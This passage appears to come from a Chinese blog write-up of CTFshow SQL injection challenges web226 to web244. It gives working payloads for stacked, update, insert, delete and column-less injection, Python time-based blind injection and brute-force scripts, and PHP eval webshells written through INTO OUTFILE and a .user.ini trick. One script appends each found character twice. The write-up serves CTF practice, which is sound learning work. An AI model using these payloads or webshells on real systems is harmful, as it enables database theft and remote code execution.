href="https://blog.csdn.net/solitudi/article/details/107823398?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160652999219721940215459%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=160652999219721940215459&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-1-107823398.pc_v2_rank_blog_default&utm_term=%E5%BC%BA%E7%BD%91%E6%9D%AF&spm=1018.2118.3001.4450">SQl注入强网杯 2019</a></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">username&#x3D;user1&#39;;PREPARE y4tacker from concat(&#39;s&#39;,&#39;elect&#39;, &#39; database()&#39;);EXECUTE y4tacker;</code></pre><p>当然<code>concat(char(115,101,108,101,99,116)</code>也可以代替<code>select</code></p><p><strong>show</strong> 展示一下表名列名</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">&#39;;show tables;#&#39;;show columns from &#96;ctfshow_flagasa&#96;;#</code></pre><h4 id="web226"><a href="#web226" class="headerlink" title="web226"></a>web226</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//师傅说过滤的越多越好</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|\(/i'</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>   </code></pre><p>ban了<code>show</code>和<code>(</code>，可以使用16进制绕过</p><p><img src="web226.png" loading="lazy"></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">?username&#x3D;user1&#39;;PREPARE hsad from 0x73656c6563742067726f75705f636f6e636174287461626c655f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d613d64617461626173652829;EXECUTE hsad;</code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">select flagasb from ctfsh_ow_flagas?username&#x3D;user1&#39;;PREPARE hsad from 0x73656c65637420666c61676173622066726f6d2063746673685f6f775f666c61676173;EXECUTE hsad;</code></pre><h4 id="web227-information-schema-Routines"><a href="#web227-information-schema-Routines" class="headerlink" title="web227(information_schema.Routines)"></a>web227(information_schema.Routines)</h4><p>这道题，你就算找遍所有地方基本上都找不到flag表<br>先给出其中一个<code>payload1&#39;;call getFlag();</code>虽然能得到答案但是意义不大<br>这道题考点其实是查看MySQL的存储过程<br><a href="https://blog.csdn.net/qq_41573234/article/details/80411079">MySQL——查看存储过程和函数</a></p><p><strong>查看存储过程和函数的信息</strong><br>在  MySQL 中，存储过程和函数的信息存储在<code>information_schema</code>数据库下的<code>Routines</code>表中，可以通过查询该表的记录来查询存储</p><p>过程和函数的信息，其基本的语法形式如下:</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT * FROM information_schema.RoutinesWHERE ROUTINE_NAME&#x3D;&#39; sp_name&#39;;</code></pre><p>其中，ROUTINE_NAME  字段中存储的是存储过程和函数的名称;   sp_name  参数表示存储过程或函数的名称。</p><p>我们去查<code>information_schema.routines</code>表</p><p><img src="web227.png" loading="lazy"></p><p>可以看到getFlag函数，当然flag直接就有</p><h4 id="web228"><a href="#web228" class="headerlink" title="web228"></a>web228</h4><p>查询语句</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//分页查询</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,pass from ctfshow_user where username = '<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$username</span><span class="token punctuation">&#125;</span></span>';"</span><span class="token punctuation">;</span><span class="token variable">$bansql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select char from banlist;"</span><span class="token punctuation">;</span>    </code></pre><p>返回逻辑</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//师傅说内容太多，就写入数据库保存</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$banlist</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$banlist</span> <span class="token keyword">as</span> <span class="token variable">$char</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token variable">$char</span><span class="token operator">.</span><span class="token string double-quoted-string">"/i"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>    </code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">select flagasba from ctfsh_ow_flagasaa?username&#x3D;user1&#39;;PREPARE hsad from 0x73656c65637420666c6167617362612066726f6d2063746673685f6f775f666c616761736161;EXECUTE hsad;</code></pre><h4 id="web229"><a href="#web229" class="headerlink" title="web229"></a>web229</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">select flagasba from flag?username&#x3D;user1&#39;;PREPARE hsad from 0x73656c65637420666c6167617362612066726f6d20666c6167;EXECUTE hsad;</code></pre><h4 id="web230"><a href="#web230" class="headerlink" title="web230"></a>web230</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">select flagasbas from flagaabbx?username&#x3D;user1&#39;;PREPARE hsad from 0x73656c65637420666c616761736261732066726f6d20666c61676161626278;EXECUTE hsad;</code></pre><h4 id="web231-update注入"><a href="#web231-update注入" class="headerlink" title="web231(update注入)"></a>web231(update注入)</h4><p>查询语句</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//分页查询</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"update ctfshow_user set pass = '<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$password</span><span class="token punctuation">&#125;</span></span>' where username = '<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$username</span><span class="token punctuation">&#125;</span></span>';"</span><span class="token punctuation">;</span>    </code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">POST:查表名  banlist,ctfshow_user,flagapassword&#x3D;ctfshow&#39;,username&#x3D;(select group_concat(table_name) from information_schema.tables where table_name&#x3D;database())#&amp;username&#x3D;no查列名  id,flagas,infopassword&#x3D;ctfshow&#39;,username&#x3D;(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flaga&#39;)#&amp;username&#x3D;nogetFlagpassword&#x3D;ctfshow&#39;,username&#x3D;(select flagas from flaga)#&amp;username&#x3D;no</code></pre><h4 id="web232"><a href="#web232" class="headerlink" title="web232"></a>web232</h4><p>和上一题相比多给 password 套了一层 md5 函数后面还有个<code>)</code>注意闭合，对后面的 username 无影响。</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">POST:查表名  banlist,ctfshow_user,flagaapassword&#x3D;ctfshow&#39;),username&#x3D;(select group_concat(table_name) from information_schema.tables where table_name&#x3D;database())#&amp;username&#x3D;no查列名  id,flagass,infopassword&#x3D;ctfshow&#39;),username&#x3D;(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flaga&#39;)#&amp;username&#x3D;nogetFlagpassword&#x3D;ctfshow&#39;),username&#x3D;(select flagas from flaga)#&amp;username&#x3D;no</code></pre><h4 id="web233"><a href="#web233" class="headerlink" title="web233"></a>web233</h4><p>禁用了<code>&#39;</code>，但是可以用<code>\</code></p><p>假设我们password传入\，username传入,username&#x3D;database()#</p><p>那么最终构成的语句如下</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">update ctfshow_user set pass &#x3D; &#39;\&#39; where username &#x3D; &#39;,username&#x3D;database()#&#39;等价于update ctfshow_user set pass &#x3D; &#39;x&#39;,username&#x3D;database()#&#39;</code></pre><p>所以就可以绕过了。</p><p><strong>payload</strong></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">#获取表名  banlist,ctfshow_user,flag233333password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())%23#获取列名  id,flagass233,infopassword&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag233333&#39;)%23#获取数据password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(flagass233) from flag233333)%23</code></pre><p>也可以使用盲注</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://c095983b-1faf-4d65-a053-ba620caed799.challenge.ctf.show/api/?page=1&amp;limit=10"</span>flag <span class="token operator">=</span> <span class="token string">""</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># 查数据库</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># 查表名</span>        <span class="token comment"># payload = "select column_name from information_schema.columns where table_name='flag233333' limit 1,1"</span>        <span class="token comment"># 查数据</span>        payload <span class="token operator">=</span> <span class="token string">"select flagass233 from flag233333"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"1' or if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(0.05),1)#"</span></span><span class="token punctuation">,</span>            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'4'</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web234"><a href="#web234" class="headerlink" title="web234"></a>web234</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">#获取表名  banlist,ctfshow_user,flag23apassword&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())%23#获取列名  id,flagass23s3,infopassword&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(column_name) from information_schema.columns where table_name&#x3D;0x666c6167323361)%23#获取数据password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(flagass23s3) from flag23a)%23</code></pre><h4 id="web235-mysql-innodb-table-stats-无列名注入"><a href="#web235-mysql-innodb-table-stats-无列名注入" class="headerlink" title="web235(mysql.innodb_table_stats  无列名注入)"></a>web235(mysql.innodb_table_stats  无列名注入)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//过滤 or ' </span></code></pre><p>因为or被禁导致<code>information_schema.tables</code>也被禁了，我们可以用表<code>mysql.innodb_table_stats</code>和<code>mysql.innodb_index_stats</code></p><p>来代替。</p><p><a href="https://www.jb51.net/article/134678.htm">概述MySQL统计信息</a></p><blockquote><p>5.6.6开始，MySQL默认使用了持久化统计信息，即INNODB_STATS_PERSISTENT&#x3D;ON，持久化统计信息保存在表mysql.innodb_table_stats和mysql.innodb_index_stats。</p></blockquote><p><a href="https://zhuanlan.zhihu.com/p/98206699">Mysql无列名注入</a></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">#获取表名  banlist,ctfshow_user,flag23a1password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(table_name) from mysql.innodb_table_stats where database_name&#x3D;database())##查数据——组合  0x2d --&gt; -password&#x3D;\&amp;username&#x3D;,username&#x3D;(select concat(&#96;1&#96;,0x2d,&#96;2&#96;,&#96;3&#96;) from (select 1,2,3 union select * from flag23a1 limit 1,1)a);##查数据——重命名，当&#96;被过滤的时候password&#x3D;\&amp;username&#x3D;,username&#x3D;(select b from (select 1,2 as b,3 union select * from flag23a1 limit 1,1)a);#</code></pre><h4 id="web236"><a href="#web236" class="headerlink" title="web236"></a>web236</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//过滤 or ' flag</span></code></pre><p>过滤的是返回的flag，所以用<code>to_base64</code>绕过</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">#获取表名  banlist,ctfshow_user,flagapassword&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(table_name) from mysql.innodb_table_stats where database_name&#x3D;database())##查数据——组合  0x2d --&gt; -password&#x3D;\&amp;username&#x3D;,username&#x3D;(select concat(&#96;1&#96;,0x2d,to_base64(&#96;2&#96;),&#96;3&#96;) from (select 1,2,3 union select * from flaga limit 1,1)a);##查数据——重命名，当&#96;被过滤的时候password&#x3D;\&amp;username&#x3D;,username&#x3D;(select to_base64(b) from (select 1,2 as b,3 union select * from flaga limit 1,1)a);#</code></pre><h4 id="web237-insert注入"><a href="#web237-insert注入" class="headerlink" title="web237(insert注入)"></a>web237(insert注入)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//插入数据</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into ctfshow_user(username,pass) value('<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$username</span><span class="token punctuation">&#125;</span></span>','<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$password</span><span class="token punctuation">&#125;</span></span>');"</span><span class="token punctuation">;</span></code></pre><p>向value值内进行插入，和update注入的逻辑一样</p><p><code>insert into table_name(column1, column2) value(value1,value2)</code></p><p>向value1进行注入，就会变成</p><p><code>insert into table_name(column1, column2) value( value1,(你想要输出的值) )#value2)</code></p><p>所以要注意对最后一个括号的闭合</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql"># 查表名  banlist,ctfshow_user,flagusername&#x3D;z&#39;,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))#&amp;password&#x3D;1# 查列名  id,flagass23s3,infousername&#x3D;zz&#39;,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;))#&amp;password&#x3D;1# getFlagusername&#x3D;zzz&#39;,(select flagass23s3 from flag))#&amp;password&#x3D;1</code></pre><h4 id="web238"><a href="#web238" class="headerlink" title="web238"></a>web238</h4><p>过滤了空格可以用<code>()</code>绕过</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql"># 查表名  banlist,ctfshow_user,flagbusername&#x3D;z&#39;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())))#&amp;password&#x3D;1# 查列名  id,flag,infousername&#x3D;zz&#39;,(select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;flagb&#39;)))#&amp;password&#x3D;1# getFlagusername&#x3D;zzz&#39;,(select(flag)from(flagb)))#&amp;password&#x3D;1</code></pre><h4 id="web239"><a href="#web239" class="headerlink" title="web239"></a>web239</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//过滤空格 or </span></code></pre><p>和之前一样可以使用mysql.innodb_table_stats</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql"># 查表名  banlist,ctfshow_user,flagbbusername&#x3D;z&#39;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name&#x3D;database())))#&amp;password&#x3D;1# getFlagusername&#x3D;zz&#39;,(select(flag)from(flagbb)))#&amp;password&#x3D;1#  不知道为什么无列名注入不行，wp都是盲猜列名username&#x3D;zz&#39;,(select(concat(&#96;1&#96;,0x2d,&#96;2&#96;,&#96;3&#96;))from((select(1,2,3)(union)select(*)from(flagbb)limit(1,1))a)))#&amp;password&#x3D;1select(concat(&#96;1&#96;,0x2d,&#96;2&#96;,&#96;3&#96;))from((select(1,2,3)(union)select(*)from(flagbb)limit(1,1))a)</code></pre><h4 id="web240"><a href="#web240" class="headerlink" title="web240"></a>web240</h4><p><strong>Hint</strong>: 表名共9位，flag开头，后五位由a&#x2F;b组成，如flagabaab，全小写</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//过滤空格 or sys mysql</span></code></pre><p>表名靠爆破列名靠猜</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> repost_url <span class="token operator">=</span> <span class="token string">"https://3db7384a-eef6-48e0-978e-5d0ddd2f9099.challenge.ctf.show/api/insert.php"</span>flag_url <span class="token operator">=</span> <span class="token string">"https://3db7384a-eef6-48e0-978e-5d0ddd2f9099.challenge.ctf.show/api/?desc&amp;page=1&amp;limit=10"</span>payloads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span>    <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"\\"</span><span class="token punctuation">,</span>    <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f",(select(flag)from(flag</span><span class="token interpolation"><span class="token punctuation">&#123;</span>a<span class="token punctuation">&#125;</span></span><span class="token string">)))#"</span></span><span class="token punctuation">&#125;</span> <span class="token keyword">for</span> a <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>a<span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span>b<span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span>c<span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span>d<span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span> <span class="token keyword">for</span> a <span class="token keyword">in</span> <span class="token string">"ab"</span> <span class="token keyword">for</span> b <span class="token keyword">in</span> <span class="token string">"ab"</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token string">"ab"</span> <span class="token keyword">for</span> d <span class="token keyword">in</span> <span class="token string">"ab"</span> <span class="token keyword">for</span> e <span class="token keyword">in</span> <span class="token string">"ab"</span><span class="token punctuation">]</span><span class="token punctuation">]</span>pattern <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'ctfshow&#123;[0-9a-fA-F\-]+&#125;'</span><span class="token punctuation">)</span><span class="token keyword">for</span> payload <span class="token keyword">in</span> payloads<span class="token punctuation">:</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>post_url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span>    response_flag <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>flag_url<span class="token punctuation">)</span>    <span class="token keyword">match</span> <span class="token operator">=</span> pattern<span class="token punctuation">.</span>search<span class="token punctuation">(</span>response_flag<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] Found: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] No flag found in the response."</span><span class="token punctuation">)</span></code></pre><h4 id="web241-delete注入"><a href="#web241-delete注入" class="headerlink" title="web241(delete注入)"></a>web241(delete注入)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//删除记录</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"delete from  ctfshow_user where id = <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$id</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span></code></pre><p>盲注</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://01d94186-8d77-44ea-a4c9-c70d61770349.challenge.ctf.show/api/delete.php"</span>flag <span class="token operator">=</span> <span class="token string">""</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># 查数据库  banlist,ctfshow_user,flag</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># 查表名  id,flag,info</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='flag'"</span>        <span class="token comment"># 查数据</span>        payload <span class="token operator">=</span> <span class="token string">"select flag from flag"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'id'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(0.05),1)#"</span></span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web242-file注入"><a href="#web242-file注入" class="headerlink" title="web242(file注入)"></a>web242(file注入)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//备份表</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select * from ctfshow_user into outfile '/var/www/html/dump/<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$filename</span><span class="token punctuation">&#125;</span></span>';"</span><span class="token punctuation">;</span>    </code></pre><p>利用info outfile的扩展参数来做题</p><ul><li>SELECT … INTO OUTFILE ‘file_name’<br>    [CHARACTER SET charset_name]<br>    [export_options]</li><li>export_options:<br>[{FIELDS | COLUMNS}<br>    [TERMINATED BY ‘string’]&#x2F;&#x2F;分隔符<br>    [[OPTIONALLY] ENCLOSED BY ‘char’]<br>    [ESCAPED BY ‘char’]<br>]<br>[LINES<br>    [STARTING BY ‘string’]<br>    [TERMINATED BY ‘string’]<br>]</li></ul><p><strong>OPTION</strong>参数为可选参数选项，其可能的取值有：</p><ul><li><p><code>FIELDS TERMINATED BY &#39;字符串&#39;</code>：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。</p></li><li><p><code>FIELDS ENCLOSED BY &#39;字符&#39;</code>：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。</p></li><li><p><code>FIELDS OPTIONALLY ENCLOSED BY &#39;字符&#39;</code>：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况不使用任何符号。</p></li><li><p><code>FIELDS ESCAPED BY &#39;字符&#39;</code>：设置转义字符，只能为单个字符。默认值为“\”。</p></li><li><p>*<code>LINES STARTING BY &#39;字符串&#39;</code>*：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。</p></li><li><p>*<code>LINES TERMINATED BY &#39;字符串&#39;</code>*：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。</p></li></ul><p>可以写马的参数有：</p><p><code>FIELDS TERMINATED BY</code>、 <code>LINES STARTING BY</code>、 <code>LINES TERMINATED BY</code></p><p>在<code>url/api/dump.php</code>下写马</p><p>马在url&#x2F;dump&#x2F;1.php</p><pre class="language-php" data-language="php"><code class="language-php">filename=1.php' LINES STARTING BY "<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>";#</code></pre><p>命令行到根目录输入</p><p><code>find / -name &quot;f*&quot; | xargs grep &quot;ctfshow&quot;</code></p><h4 id="web243"><a href="#web243" class="headerlink" title="web243"></a>web243</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//过滤了php</span></code></pre><p>先上ini：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">filename&#x3D;.user.ini&#39; LINES STARTING BY &#39;;&#39; TERMINATED BY 0x0a6175746f5f70726570656e645f66696c653a312e6a7067;## auto_prepend_file:1.jpg</code></pre><p>注意16进制是为了0a(换行)发挥作用，而<code>starting by “;”，</code>是想让每行数据的开头字符都是分号，是为了让前面的那个</p><p><code>select * from ctfshow_user</code>查出来的东西与后面的做个了断，然后上🐎</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">filename&#x3D;1.jpg&#39; LINES TERMINATED BY 0x3c3f3d6576616c28245f504f53545b315d293b3f3e;## &lt;?&#x3D;eval($_POST[1]);?&gt;</code></pre><p>（做了半天一直403，看到有一位师傅也是一样，于是把https的s去掉就可以了）</p><h4 id="web244-error注入-updatexml"><a href="#web244-error注入-updatexml" class="headerlink" title="web244(error注入  updatexml)"></a>web244(error注入  updatexml)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//备份表</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,pass from ctfshow_user where id = '"</span><span class="token operator">.</span><span class="token variable">$id</span><span class="token operator">.</span><span class="token string double-quoted-string">"' limit 1;"</span><span class="token punctuation">;</span></code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">extractvalue(目标xml文档，xml路径):对XML文档进行查询的函数updatexml(目标xml文档，xml路径，更新的内容):更新xml文档的函数其都是针对xml路径进行的注入</code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">?id&#x3D;1&#39; or 